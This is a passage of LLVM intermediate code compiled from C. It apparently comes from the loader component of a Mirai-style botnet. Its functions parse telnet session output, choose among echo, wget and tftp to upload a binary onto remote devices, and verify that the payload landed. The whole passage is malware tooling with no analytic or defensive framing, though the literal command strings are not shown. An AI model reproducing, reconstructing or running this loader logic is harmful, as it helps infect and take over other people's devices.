  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  %12 = call i32 @util_memsearch(i8* %7, i32 %11, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i64 0, i64 0), i32 23)
  store i32 %12, i32* %4, align 4
  %13 = load i32, i32* %4, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

15:                                               ; preds = %1
  store i32 0, i32* %2, align 4
  br label %38

16:                                               ; preds = %1
  %17 = load %struct.connection*, %struct.connection** %3, align 8
  %18 = getelementptr inbounds %struct.connection, %struct.connection* %17, i32 0, i32 18
  %19 = getelementptr inbounds [8192 x i8], [8192 x i8]* %18, i64 0, i64 0
  %20 = load i32, i32* %4, align 4
  %21 = call i32 @util_memsearch(i8* %19, i32 %20, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.15, i64 0, i64 0), i32 5)
  %22 = icmp ne i32 %21, -1
  br i1 %22, label %30, label %23

23:                                               ; preds = %16
  %24 = load %struct.connection*, %struct.connection** %3, align 8
  %25 = getelementptr inbounds %struct.connection, %struct.connection* %24, i32 0, i32 18
  %26 = getelementptr inbounds [8192 x i8], [8192 x i8]* %25, i64 0, i64 0
  %27 = load i32, i32* %4, align 4
  %28 = call i32 @util_memsearch(i8* %26, i32 %27, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.16, i64 0, i64 0), i32 5)
  %29 = icmp ne i32 %28, -1
  br i1 %29, label %30, label %36

30:                                               ; preds = %23, %16
  %31 = load %struct.connection*, %struct.connection** %3, align 8
  %32 = getelementptr inbounds %struct.connection, %struct.connection* %31, i32 0, i32 3
  %33 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %32, i32 0, i32 2
  %34 = getelementptr inbounds [6 x i8], [6 x i8]* %33, i64 0, i64 0
  %35 = call i8* @strcpy(i8* %34, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.17, i64 0, i64 0)) #5
  br label %36

36:                                               ; preds = %30, %23
  %37 = load i32, i32* %4, align 4
  store i32 %37, i32* %2, align 4
  br label %38

38:                                               ; preds = %36, %15
  %39 = load i32, i32* %2, align 4
  ret i32 %39
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @connection_consume_upload_methods(%struct.connection* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %5 = load %struct.connection*, %struct.connection** %3, align 8
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %5, i32 0, i32 18
  %7 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i64 0, i64 0
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 12
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  %12 = call i32 @util_memsearch(i8* %7, i32 %11, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i64 0, i64 0), i32 23)
  store i32 %12, i32* %4, align 4
  %13 = load i32, i32* %4, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

15:                                               ; preds = %1
  store i32 0, i32* %2, align 4
  br label %45

16:                                               ; preds = %1
  %17 = load %struct.connection*, %struct.connection** %3, align 8
  %18 = getelementptr inbounds %struct.connection, %struct.connection* %17, i32 0, i32 18
  %19 = getelementptr inbounds [8192 x i8], [8192 x i8]* %18, i64 0, i64 0
  %20 = load i32, i32* %4, align 4
  %21 = call i32 @util_memsearch(i8* %19, i32 %20, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.18, i64 0, i64 0), i32 22)
  %22 = icmp eq i32 %21, -1
  br i1 %22, label %23, label %27

23:                                               ; preds = %16
  %24 = load %struct.connection*, %struct.connection** %3, align 8
  %25 = getelementptr inbounds %struct.connection, %struct.connection* %24, i32 0, i32 3
  %26 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %25, i32 0, i32 6
  store i32 1, i32* %26, align 8
  br label %43

27:                                               ; preds = %16
  %28 = load %struct.connection*, %struct.connection** %3, align 8
  %29 = getelementptr inbounds %struct.connection, %struct.connection* %28, i32 0, i32 18
  %30 = getelementptr inbounds [8192 x i8], [8192 x i8]* %29, i64 0, i64 0
  %31 = load i32, i32* %4, align 4
  %32 = call i32 @util_memsearch(i8* %30, i32 %31, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.19, i64 0, i64 0), i32 22)
  %33 = icmp eq i32 %32, -1
  br i1 %33, label %34, label %38

34:                                               ; preds = %27
  %35 = load %struct.connection*, %struct.connection** %3, align 8
  %36 = getelementptr inbounds %struct.connection, %struct.connection* %35, i32 0, i32 3
  %37 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %36, i32 0, i32 6
  store i32 2, i32* %37, align 8
  br label %42

38:                                               ; preds = %27
  %39 = load %struct.connection*, %struct.connection** %3, align 8
  %40 = getelementptr inbounds %struct.connection, %struct.connection* %39, i32 0, i32 3
  %41 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %40, i32 0, i32 6
  store i32 0, i32* %41, align 8
  br label %42

42:                                               ; preds = %38, %34
  br label %43

43:                                               ; preds = %42, %23
  %44 = load i32, i32* %4, align 4
  store i32 %44, i32* %2, align 4
  br label %45

45:                                               ; preds = %43, %15
  %46 = load i32, i32* %2, align 4
  ret i32 %46
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @connection_upload_echo(%struct.connection* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %5 = load %struct.connection*, %struct.connection** %3, align 8
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %5, i32 0, i32 18
  %7 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i64 0, i64 0
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 12
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  %12 = call i32 @util_memsearch(i8* %7, i32 %11, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i64 0, i64 0), i32 23)
  store i32 %12, i32* %4, align 4
  %13 = load i32, i32* %4, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

15:                                               ; preds = %1
  store i32 0, i32* %2, align 4
  br label %112

16:                                               ; preds = %1
  %17 = load %struct.connection*, %struct.connection** %3, align 8
  %18 = getelementptr inbounds %struct.connection, %struct.connection* %17, i32 0, i32 2
  %19 = load %struct.binary*, %struct.binary** %18, align 8
  %20 = icmp eq %struct.binary* %19, null
  br i1 %20, label %21, label %23

21:                                               ; preds = %16
  %22 = load %struct.connection*, %struct.connection** %3, align 8
  call void @connection_close(%struct.connection* %22)
  store i32 0, i32* %2, align 4
  br label %112

23:                                               ; preds = %16
  %24 = load %struct.connection*, %struct.connection** %3, align 8
  %25 = getelementptr inbounds %struct.connection, %struct.connection* %24, i32 0, i32 5
  %26 = load i32, i32* %25, align 4
  %27 = load %struct.connection*, %struct.connection** %3, align 8
  %28 = getelementptr inbounds %struct.connection, %struct.connection* %27, i32 0, i32 2
  %29 = load %struct.binary*, %struct.binary** %28, align 8
  %30 = getelementptr inbounds %struct.binary, %struct.binary* %29, i32 0, i32 1
  %31 = load i32, i32* %30, align 8
  %32 = icmp eq i32 %26, %31
  br i1 %32, label %33, label %35

33:                                               ; preds = %23
  %34 = load i32, i32* %4, align 4
  store i32 %34, i32* %2, align 4
  br label %112

35:                                               ; preds = %23
  %36 = load %struct.connection*, %struct.connection** %3, align 8
  %37 = getelementptr inbounds %struct.connection, %struct.connection* %36, i32 0, i32 6
  %38 = load i32, i32* %37, align 8
  %39 = icmp eq i32 %38, 1
  br i1 %39, label %40, label %62

40:                                               ; preds = %35
  %41 = load %struct.connection*, %struct.connection** %3, align 8
  %42 = getelementptr inbounds %struct.connection, %struct.connection* %41, i32 0, i32 4
  %43 = load i32, i32* %42, align 8
  %44 = load %struct.connection*, %struct.connection** %3, align 8
  %45 = getelementptr inbounds %struct.connection, %struct.connection* %44, i32 0, i32 2
  %46 = load %struct.binary*, %struct.binary** %45, align 8
  %47 = getelementptr inbounds %struct.binary, %struct.binary* %46, i32 0, i32 2
  %48 = load i8**, i8*** %47, align 8
  %49 = load %struct.connection*, %struct.connection** %3, align 8
  %50 = getelementptr inbounds %struct.connection, %struct.connection* %49, i32 0, i32 5
  %51 = load i32, i32* %50, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds i8*, i8** %48, i64 %52
  %54 = load i8*, i8** %53, align 8
  %55 = load %struct.connection*, %struct.connection** %3, align 8
  %56 = getelementptr inbounds %struct.connection, %struct.connection* %55, i32 0, i32 5
  %57 = load i32, i32* %56, align 4
  %58 = icmp eq i32 %57, 0
  %59 = zext i1 %58 to i64
  %60 = select i1 %58, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.21, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.22, i64 0, i64 0)
  %61 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %43, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.20, i64 0, i64 0), i8* %54, i8* %60, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.23, i64 0, i64 0))
  br label %84

62:                                               ; preds = %35
  %63 = load %struct.connection*, %struct.connection** %3, align 8
  %64 = getelementptr inbounds %struct.connection, %struct.connection* %63, i32 0, i32 4
  %65 = load i32, i32* %64, align 8
  %66 = load %struct.connection*, %struct.connection** %3, align 8
  %67 = getelementptr inbounds %struct.connection, %struct.connection* %66, i32 0, i32 2
  %68 = load %struct.binary*, %struct.binary** %67, align 8
  %69 = getelementptr inbounds %struct.binary, %struct.binary* %68, i32 0, i32 2
  %70 = load i8**, i8*** %69, align 8
  %71 = load %struct.connection*, %struct.connection** %3, align 8
  %72 = getelementptr inbounds %struct.connection, %struct.connection* %71, i32 0, i32 5
  %73 = load i32, i32* %72, align 4
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds i8*, i8** %70, i64 %74
  %76 = load i8*, i8** %75, align 8
  %77 = load %struct.connection*, %struct.connection** %3, align 8
  %78 = getelementptr inbounds %struct.connection, %struct.connection* %77, i32 0, i32 5
  %79 = load i32, i32* %78, align 4
  %80 = icmp eq i32 %79, 0
  %81 = zext i1 %80 to i64
  %82 = select i1 %80, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.21, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.22, i64 0, i64 0)
  %83 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %65, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.24, i64 0, i64 0), i8* %76, i8* %82, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.23, i64 0, i64 0))
  br label %84

84:                                               ; preds = %62, %40
  %85 = load %struct.connection*, %struct.connection** %3, align 8
  %86 = getelementptr inbounds %struct.connection, %struct.connection* %85, i32 0, i32 5
  %87 = load i32, i32* %86, align 4
  %88 = add nsw i32 %87, 1
  store i32 %88, i32* %86, align 4
  %89 = load %struct.connection*, %struct.connection** %3, align 8
  %90 = getelementptr inbounds %struct.connection, %struct.connection* %89, i32 0, i32 18
  %91 = getelementptr inbounds [8192 x i8], [8192 x i8]* %90, i64 0, i64 0
  %92 = load %struct.connection*, %struct.connection** %3, align 8
  %93 = getelementptr inbounds %struct.connection, %struct.connection* %92, i32 0, i32 18
  %94 = getelementptr inbounds [8192 x i8], [8192 x i8]* %93, i64 0, i64 0
  %95 = load i32, i32* %4, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds i8, i8* %94, i64 %96
  %98 = load %struct.connection*, %struct.connection** %3, align 8
  %99 = getelementptr inbounds %struct.connection, %struct.connection* %98, i32 0, i32 12
  %100 = load i16, i16* %99, align 8
  %101 = zext i16 %100 to i32
  %102 = load i32, i32* %4, align 4
  %103 = sub nsw i32 %101, %102
  %104 = sext i32 %103 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* align 8 %91, i8* align 1 %97, i64 %104, i1 false)
  %105 = load i32, i32* %4, align 4
  %106 = load %struct.connection*, %struct.connection** %3, align 8
  %107 = getelementptr inbounds %struct.connection, %struct.connection* %106, i32 0, i32 12
  %108 = load i16, i16* %107, align 8
  %109 = zext i16 %108 to i32
  %110 = sub nsw i32 %109, %105
  %111 = trunc i32 %110 to i16
  store i16 %111, i16* %107, align 8
  store i32 0, i32* %2, align 4
  br label %112

112:                                              ; preds = %84, %33, %21, %15
  %113 = load i32, i32* %2, align 4
  ret i32 %113
}

declare signext i8 @util_sockprintf(i32, i8*, ...) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @connection_upload_wget(%struct.connection* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %5 = load %struct.connection*, %struct.connection** %3, align 8
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %5, i32 0, i32 18
  %7 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i64 0, i64 0
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 12
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  %12 = call i32 @util_memsearch(i8* %7, i32 %11, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i64 0, i64 0), i32 23)
  store i32 %12, i32* %4, align 4
  %13 = load i32, i32* %4, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

15:                                               ; preds = %1
  store i32 0, i32* %2, align 4
  br label %63

16:                                               ; preds = %1
  %17 = load %struct.connection*, %struct.connection** %3, align 8
  %18 = getelementptr inbounds %struct.connection, %struct.connection* %17, i32 0, i32 18
  %19 = getelementptr inbounds [8192 x i8], [8192 x i8]* %18, i64 0, i64 0
  %20 = load i32, i32* %4, align 4
  %21 = call i32 @util_memsearch(i8* %19, i32 %20, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.25, i64 0, i64 0), i32 17)
  %22 = icmp ne i32 %21, -1
  br i1 %22, label %23, label %26

23:                                               ; preds = %16
  %24 = load i32, i32* %4, align 4
  %25 = mul nsw i32 %24, -1
  store i32 %25, i32* %2, align 4
  br label %63

26:                                               ; preds = %16
  %27 = load %struct.connection*, %struct.connection** %3, align 8
  %28 = getelementptr inbounds %struct.connection, %struct.connection* %27, i32 0, i32 18
  %29 = getelementptr inbounds [8192 x i8], [8192 x i8]* %28, i64 0, i64 0
  %30 = load i32, i32* %4, align 4
  %31 = call i32 @util_memsearch(i8* %29, i32 %30, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.26, i64 0, i64 0), i32 13)
  %32 = icmp ne i32 %31, -1
  br i1 %32, label %33, label %36

33:                                               ; preds = %26
  %34 = load i32, i32* %4, align 4
  %35 = mul nsw i32 %34, -1
  store i32 %35, i32* %2, align 4
  br label %63

36:                                               ; preds = %26
  %37 = load %struct.connection*, %struct.connection** %3, align 8
  %38 = getelementptr inbounds %struct.connection, %struct.connection* %37, i32 0, i32 18
  %39 = getelementptr inbounds [8192 x i8], [8192 x i8]* %38, i64 0, i64 0
  %40 = load i32, i32* %4, align 4
  %41 = call i32 @util_memsearch(i8* %39, i32 %40, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.27, i64 0, i64 0), i32 13)
  %42 = icmp ne i32 %41, -1
  br i1 %42, label %43, label %46

43:                                               ; preds = %36
  %44 = load i32, i32* %4, align 4
  %45 = mul nsw i32 %44, -1
  store i32 %45, i32* %2, align 4
  br label %63

46:                                               ; preds = %36
  %47 = load %struct.connection*, %struct.connection** %3, align 8
  %48 = getelementptr inbounds %struct.connection, %struct.connection* %47, i32 0, i32 18
  %49 = getelementptr inbounds [8192 x i8], [8192 x i8]* %48, i64 0, i64 0
  %50 = load i32, i32* %4, align 4
  %51 = call i32 @util_memsearch(i8* %49, i32 %50, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.28, i64 0, i64 0), i32 23)
  %52 = icmp ne i32 %51, -1
  br i1 %52, label %53, label %58

53:                                               ; preds = %46
  %54 = load %struct.connection*, %struct.connection** %3, align 8
  %55 = getelementptr inbounds %struct.connection, %struct.connection* %54, i32 0, i32 8
  store i32 1, i32* %55, align 8
  %56 = load i32, i32* %4, align 4
  %57 = mul nsw i32 %56, -1
  store i32 %57, i32* %2, align 4
  br label %63

58:                                               ; preds = %46
  br label %59

59:                                               ; preds = %58
  br label %60

60:                                               ; preds = %59
  br label %61

61:                                               ; preds = %60
  %62 = load i32, i32* %4, align 4
  store i32 %62, i32* %2, align 4
  br label %63

63:                                               ; preds = %61, %53, %43, %33, %23, %15
  %64 = load i32, i32* %2, align 4
  ret i32 %64
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @connection_upload_tftp(%struct.connection* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %5 = load %struct.connection*, %struct.connection** %3, align 8
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %5, i32 0, i32 18
  %7 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i64 0, i64 0
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 12
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  %12 = call i32 @util_memsearch(i8* %7, i32 %11, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i64 0, i64 0), i32 23)
  store i32 %12, i32* %4, align 4
  %13 = load i32, i32* %4, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

15:                                               ; preds = %1
  store i32 0, i32* %2, align 4
  br label %74

16:                                               ; preds = %1
  %17 = load %struct.connection*, %struct.connection** %3, align 8
  %18 = getelementptr inbounds %struct.connection, %struct.connection* %17, i32 0, i32 18
  %19 = getelementptr inbounds [8192 x i8], [8192 x i8]* %18, i64 0, i64 0
  %20 = load i32, i32* %4, align 4
  %21 = call i32 @util_memsearch(i8* %19, i32 %20, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.25, i64 0, i64 0), i32 17)
  %22 = icmp ne i32 %21, -1
  br i1 %22, label %23, label %26

23:                                               ; preds = %16
  %24 = load i32, i32* %4, align 4
  %25 = mul nsw i32 %24, -1
  store i32 %25, i32* %2, align 4
  br label %74

26:                                               ; preds = %16
  %27 = load %struct.connection*, %struct.connection** %3, align 8
  %28 = getelementptr inbounds %struct.connection, %struct.connection* %27, i32 0, i32 18
  %29 = getelementptr inbounds [8192 x i8], [8192 x i8]* %28, i64 0, i64 0
  %30 = load i32, i32* %4, align 4
  %31 = call i32 @util_memsearch(i8* %29, i32 %30, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.29, i64 0, i64 0), i32 7)
  %32 = icmp ne i32 %31, -1
  br i1 %32, label %33, label %36

33:                                               ; preds = %26
  %34 = load i32, i32* %4, align 4
  %35 = mul nsw i32 %34, -1
  store i32 %35, i32* %2, align 4
  br label %74

36:                                               ; preds = %26
  %37 = load %struct.connection*, %struct.connection** %3, align 8
  %38 = getelementptr inbounds %struct.connection, %struct.connection* %37, i32 0, i32 18
  %39 = getelementptr inbounds [8192 x i8], [8192 x i8]* %38, i64 0, i64 0
  %40 = load i32, i32* %4, align 4
  %41 = call i32 @util_memsearch(i8* %39, i32 %40, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.27, i64 0, i64 0), i32 13)
  %42 = icmp ne i32 %41, -1
  br i1 %42, label %43, label %46

43:                                               ; preds = %36
  %44 = load i32, i32* %4, align 4
  %45 = mul nsw i32 %44, -1
  store i32 %45, i32* %2, align 4
  br label %74

46:                                               ; preds = %36
  %47 = load %struct.connection*, %struct.connection** %3, align 8
  %48 = getelementptr inbounds %struct.connection, %struct.connection* %47, i32 0, i32 18
  %49 = getelementptr inbounds [8192 x i8], [8192 x i8]* %48, i64 0, i64 0
  %50 = load i32, i32* %4, align 4
  %51 = call i32 @util_memsearch(i8* %49, i32 %50, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.26, i64 0, i64 0), i32 13)
  %52 = icmp ne i32 %51, -1
  br i1 %52, label %53, label %56

53:                                               ; preds = %46
  %54 = load i32, i32* %4, align 4
  %55 = mul nsw i32 %54, -1
  store i32 %55, i32* %2, align 4
  br label %74

56:                                               ; preds = %46
  %57 = load %struct.connection*, %struct.connection** %3, align 8
  %58 = getelementptr inbounds %struct.connection, %struct.connection* %57, i32 0, i32 18
  %59 = getelementptr inbounds [8192 x i8], [8192 x i8]* %58, i64 0, i64 0
  %60 = load i32, i32* %4, align 4
  %61 = call i32 @util_memsearch(i8* %59, i32 %60, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.28, i64 0, i64 0), i32 23)
  %62 = icmp ne i32 %61, -1
  br i1 %62, label %63, label %68

63:                                               ; preds = %56
  %64 = load %struct.connection*, %struct.connection** %3, align 8
  %65 = getelementptr inbounds %struct.connection, %struct.connection* %64, i32 0, i32 8
  store i32 1, i32* %65, align 8
  %66 = load i32, i32* %4, align 4
  %67 = mul nsw i32 %66, -1
  store i32 %67, i32* %2, align 4
  br label %74

68:                                               ; preds = %56
  br label %69

69:                                               ; preds = %68
  br label %70

70:                                               ; preds = %69
  br label %71

71:                                               ; preds = %70
  br label %72

72:                                               ; preds = %71
  %73 = load i32, i32* %4, align 4
  store i32 %73, i32* %2, align 4
  br label %74

74:                                               ; preds = %72, %63, %53, %43, %33, %23, %15
  %75 = load i32, i32* %2, align 4
  ret i32 %75
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @connection_verify_payload(%struct.connection* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %5 = load %struct.connection*, %struct.connection** %3, align 8
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %5, i32 0, i32 18
  %7 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i64 0, i64 0
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 12
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  %12 = call i32 @util_memsearch(i8* %7, i32 %11, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.30, i64 0, i64 0), i32 24)
  store i32 %12, i32* %4, align 4
  %13 = load i32, i32* %4, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

15:                                               ; preds = %1
  store i32 0, i32* %2, align 4
  br label %28

16:                                               ; preds = %1
  %17 = load %struct.connection*, %struct.connection** %3, align 8
  %18 = getelementptr inbounds %struct.connection, %struct.connection* %17, i32 0, i32 18
  %19 = getelementptr inbounds [8192 x i8], [8192 x i8]* %18, i64 0, i64 0
  %20 = load i32, i32* %4, align 4
  %21 = call i32 @util_memsearch(i8* %19, i32 %20, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.31, i64 0, i64 0), i32 16)
  %22 = icmp eq i32 %21, -1
  br i1 %22, label %23, label %25

23:                                               ; preds = %16
  %24 = load i32, i32* %4, align 4
  store i32 %24, i32* %2, align 4
  br label %28

25:                                               ; preds = %16
  %26 = load i32, i32* %4, align 4
  %27 = add nsw i32 255, %26
  store i32 %27, i32* %2, align 4
  br label %28

28:                                               ; preds = %25, %23, %15
  %29 = load i32, i32* %2, align 4
  ret i32 %29
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @connection_consume_cleanup(%struct.connection* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %5 = load %struct.connection*, %struct.connection** %3, align 8
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %5, i32 0, i32 18
  %7 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i64 0, i64 0
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 12
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  %12 = call i32 @util_memsearch(i8* %7, i32 %11, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i64 0, i64 0), i32 23)
  store i32 %12, i32* %4, align 4
  %13 = load i32, i32* %4, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

15:                                               ; preds = %1
  store i32 0, i32* %2, align 4
  br label %18

16:                                               ; preds = %1
  %17 = load i32, i32* %4, align 4
  store i32 %17, i32* %2, align 4
  br label %18

18:                                               ; preds = %16, %15
  %19 = load i32, i32* %2, align 4
  ret i32 %19
}

attributes #0 = { noinline nounwind optnone sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { argmemonly nofree nounwind willreturn writeonly }
attributes #3 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { argmemonly nofree nounwind willreturn }
attributes #5 = { nounwind }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{!"clang version 13.0.1"}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
